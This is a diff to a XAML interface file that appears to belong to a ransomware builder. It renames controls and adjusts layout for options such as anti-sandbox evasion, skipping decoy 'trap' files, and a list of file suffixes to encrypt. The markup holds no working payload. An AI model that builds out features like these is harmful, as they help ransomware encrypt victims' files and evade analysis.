@@ -12,21 +12,21 @@
         </Grid.ColumnDefinitions>
         <GroupBox HorizontalAlignment="Left" Height="195" Header="Setting" Margin="10,0,0,0" VerticalAlignment="Top" Width="225">
             <StackPanel HorizontalAlignment="Left" Height="164" Margin="10,0,0,0" VerticalAlignment="Top" Width="199">
-                <CheckBox Content="Reduce program size" Height="20" Width="180" HorizontalAlignment="Left" FontSize="16">
+                <CheckBox x:Name="chk_resize" Content="Reduce program size" Height="20" Width="180" HorizontalAlignment="Left" FontSize="16">
                     <CheckBox.ToolTip>
                         <ToolTip>
                             <TextBlock Text="Use compiler additional options to reduce generated size"/>
                         </ToolTip>
                     </CheckBox.ToolTip>
                 </CheckBox>
-                <CheckBox Content="Anti ransom trap" Height="20" Width="180" FontSize="16" HorizontalAlignment="Left">
+                <CheckBox x:Name="chk_trap" Content="Anti ransom trap" Height="20" Width="180" FontSize="16" HorizontalAlignment="Left">
                     <CheckBox.ToolTip>
                         <ToolTip>
                             <TextBlock Text="Detect and skip suspicious files"/>
                         </ToolTip>
                     </CheckBox.ToolTip>
                 </CheckBox>
-                <CheckBox Content="Anti sandbox" Height="26" Width="178" HorizontalAlignment="Left" FontSize="16">
+                <CheckBox x:Name="chk_sandbox" Content="Anti sandbox" Height="26" Width="178" HorizontalAlignment="Left" FontSize="16">
                     <CheckBox.ToolTip>
                         <ToolTip>
                             <TextBlock Text="Slows down and hinders running in the sandbox"/>
@@ -57,9 +57,9 @@
         <GroupBox HorizontalAlignment="Left" Height="195" Header="Type" Margin="240,0,0,0" VerticalAlignment="Top" Width="463" Grid.ColumnSpan="2">
             <Grid HorizontalAlignment="Left" Height="185" Margin="10,0,0,0" VerticalAlignment="Top" Width="434">
                 <Grid.RowDefinitions>
-                    <RowDefinition Height="86*"/>
-                    <RowDefinition Height="8*"/>
-                    <RowDefinition Height="61*"/>
+                    <RowDefinition Height="103*"/>
+                    <RowDefinition Height="10*"/>
+                    <RowDefinition Height="72.806"/>
                 </Grid.RowDefinitions>
                 <RadioButton x:Name="rdb_cs" Content="C#" HorizontalAlignment="Left" Height="21" Margin="28,-2,0,0" VerticalAlignment="Top" Width="129" IsChecked="False" Checked="Rdb_cs_Checked" Loaded="Rdb_cs_Loaded">
                     <RadioButton.ToolTip>
@@ -97,7 +97,7 @@
                         </ToolTip>
                     </TextBox.ToolTip>
                 </TextBox>
-                <TextBox x:Name="tbox_suffix_list" HorizontalAlignment="Center" Height="47" Margin="0,9,0,0" TextWrapping="Wrap" Text="&quot;.ppt&quot;,&quot;.html&quot;,&quot;.pptx&quot;" VerticalAlignment="Top" Width="414" FontSize="18" Grid.Row="1" Grid.RowSpan="2">
+                <TextBox x:Name="tbox_suffix_list" HorizontalAlignment="Center" Height="47" Margin="0,9,0,0" TextWrapping="Wrap" Text=".ppt,.html,.pptx" VerticalAlignment="Top" Width="414" FontSize="18" Grid.Row="1" Grid.RowSpan="2">
                     <TextBox.ToolTip>
                         <ToolTip>
                             <TextBlock Text="List of suffixes encrypted by ransomware"/>
